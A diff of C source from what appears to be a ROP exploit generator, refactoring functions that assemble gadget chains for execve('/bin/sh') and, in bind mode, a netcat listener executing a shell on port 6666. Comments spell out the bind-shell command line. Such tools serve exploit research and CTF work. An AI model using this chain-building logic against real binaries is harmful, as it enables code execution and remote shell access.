@@ -208,7 +208,7 @@ int offset_start)
 
 /* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
 /* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
-static void makepartie1(t_asm *asm, t_list_inst *list_ins, int local)
+static void makepartie1(t_list_inst *list_ins, int local)
 {
   Elf32_Addr addr_mov_gadget;
   Elf32_Addr addr_xor_gadget;
@@ -226,7 +226,7 @@ static void makepartie1(t_asm *asm, t_list_inst *list_ins, int local)
 
 
   addr_mov_gadget = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
-  mov_gadget = get_gadget_since_addr_att(asm, addr_mov_gadget);
+  mov_gadget = get_gadget_since_addr_att(tab_x8632, addr_mov_gadget);
 
   first_reg = get_reg(mov_gadget, 1);
   second_reg = get_reg(mov_gadget, 0);
@@ -236,12 +236,12 @@ static void makepartie1(t_asm *asm, t_list_inst *list_ins, int local)
   strncat(instr_xor, first_reg, 3);
 
   addr_pop_stack_gadget = ret_addr_makecodefunc(list_ins, reg_stack);
-  pop_stack_gadget = get_gadget_since_addr_att(asm, addr_pop_stack_gadget);
+  pop_stack_gadget = get_gadget_since_addr_att(tab_x8632, addr_pop_stack_gadget);
   addr_pop_binsh_gadget = ret_addr_makecodefunc(list_ins, reg_binsh);
-  pop_binsh_gadget = get_gadget_since_addr_att(asm, addr_pop_binsh_gadget);
+  pop_binsh_gadget = get_gadget_since_addr_att(tab_x8632, addr_pop_binsh_gadget);
 
   addr_xor_gadget = ret_addr_makecodefunc(list_ins, instr_xor);
-  xor_gadget = get_gadget_since_addr(asm, addr_xor_gadget);
+  xor_gadget = get_gadget_since_addr(tab_x8632, addr_xor_gadget);
 
   fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
   if (local)
@@ -293,7 +293,7 @@ static void makepartie1(t_asm *asm, t_list_inst *list_ins, int local)
 
 /* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
 /* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
-static void makepartie2(t_asm *asm, t_list_inst *list_ins, int local)
+static void makepartie2(t_list_inst *list_ins, int local)
 {
   Elf32_Addr addr_pop_ebx;
   Elf32_Addr addr_pop_ecx;
@@ -315,19 +315,19 @@ static void makepartie2(t_asm *asm, t_list_inst *list_ins, int local)
   addr_pop_ebx = ret_addr_makecodefunc(list_ins, "pop %ebx");
   addr_pop_ecx = ret_addr_makecodefunc(list_ins, "pop %ecx");
   addr_pop_edx = ret_addr_makecodefunc(list_ins, "pop %edx");
-  pop_ebx_gadget = get_gadget_since_addr_att(asm, addr_pop_ebx);
-  pop_ecx_gadget = get_gadget_since_addr_att(asm, addr_pop_ecx);
-  pop_edx_gadget = get_gadget_since_addr_att(asm, addr_pop_edx);
+  pop_ebx_gadget = get_gadget_since_addr_att(tab_x8632, addr_pop_ebx);
+  pop_ecx_gadget = get_gadget_since_addr_att(tab_x8632, addr_pop_ecx);
+  pop_edx_gadget = get_gadget_since_addr_att(tab_x8632, addr_pop_edx);
 
   addr_xor_eax = ret_addr_makecodefunc(list_ins, "xor %eax,%eax");
   addr_inc_eax = ret_addr_makecodefunc(list_ins, "inc %eax");
-  xor_eax_gadget = get_gadget_since_addr_att(asm, addr_xor_eax);
-  inc_eax_gadget = get_gadget_since_addr_att(asm, addr_inc_eax);
+  xor_eax_gadget = get_gadget_since_addr_att(tab_x8632, addr_xor_eax);
+  inc_eax_gadget = get_gadget_since_addr_att(tab_x8632, addr_inc_eax);
 
   addr_int_0x80 = ret_addr_makecodefunc(list_ins, "int $0x80");
   addr_sysenter = ret_addr_makecodefunc(list_ins, "sysenter");
   addr_pop_ebp  = ret_addr_makecodefunc(list_ins, "pop %ebp");
-  pop_ebp_gadget = get_gadget_since_addr_att(asm, addr_pop_ebp);
+  pop_ebp_gadget = get_gadget_since_addr_att(tab_x8632, addr_pop_ebp);
 
   /* set %ebx */
   print_code_padded(addr_pop_ebx, pop_ebx_gadget, "pop %ebx");
@@ -359,10 +359,10 @@ static void makepartie2(t_asm *asm, t_list_inst *list_ins, int local)
     }
 }
 
-void x8632_makecode(t_asm *asm, t_list_inst *list_ins)
+void x8632_makecode(t_list_inst *list_ins)
 {
-  makepartie1(asm, list_ins, !bind_mode.flag);
-  makepartie2(asm, list_ins, !bind_mode.flag);
+  makepartie1(list_ins, !bind_mode.flag);
+  makepartie2(list_ins, !bind_mode.flag);
   fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
   free_list_inst(list_ins);
 }
@@ -381,7 +381,7 @@ static int check_opcode_was_found(void)
 }
 
 /* partie 1 | import shellcode in ROP instruction */
-static void makepartie1_importsc(t_asm *asm, t_list_inst *list_ins, int useless, char *pop_reg)
+static void makepartie1_importsc(t_list_inst *list_ins, int useless, char *pop_reg)
 {
 /*
   gad1 pop %e?x
@@ -402,13 +402,13 @@ static void makepartie1_importsc(t_asm *asm, t_list_inst *list_ins, int useless,
   char comment[32] = {0};
 
   addr_gad1 = ret_addr_makecodefunc(list_ins, pop_reg);
-  gad1      = get_gadget_since_addr(asm, addr_gad1);
+  gad1      = get_gadget_since_addr(tab_x8632, addr_gad1);
   addr_gad2 = ret_addr_makecodefunc(list_ins, "mov (%e?x),%e?x");
-  gad2      = get_gadget_since_addr(asm, addr_gad2);
+  gad2      = get_gadget_since_addr(tab_x8632, addr_gad2);
   addr_gad3 = ret_addr_makecodefunc(list_ins, "mov %e?x,%e?x");
-  gad3      = get_gadget_since_addr(asm, addr_gad3);
+  gad3      = get_gadget_since_addr(tab_x8632, addr_gad3);
   addr_gad4 = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
-  gad4      = get_gadget_since_addr(asm, addr_gad4);
+  gad4      = get_gadget_since_addr(tab_x8632, addr_gad4);
 
   /* check if all opcodes about shellcode was found in .text */
   if (!check_opcode_was_found())
@@ -446,9 +446,9 @@ static void makepartie1_importsc(t_asm *asm, t_list_inst *list_ins, int useless,
   fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # jump to our shellcode in .got%s\n", BLUE,  Addr_sGot , ENDC);
 }
 
-void x8632_makecode_importsc(t_asm *asm, t_list_inst *list_ins, int useless, char *pop_reg)
+void x8632_makecode_importsc(t_list_inst *list_ins, int useless, char *pop_reg)
 {
-  makepartie1_importsc(asm, list_ins, useless, pop_reg);
+  makepartie1_importsc(list_ins, useless, pop_reg);
   fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
   free_list_inst(list_ins);
 }
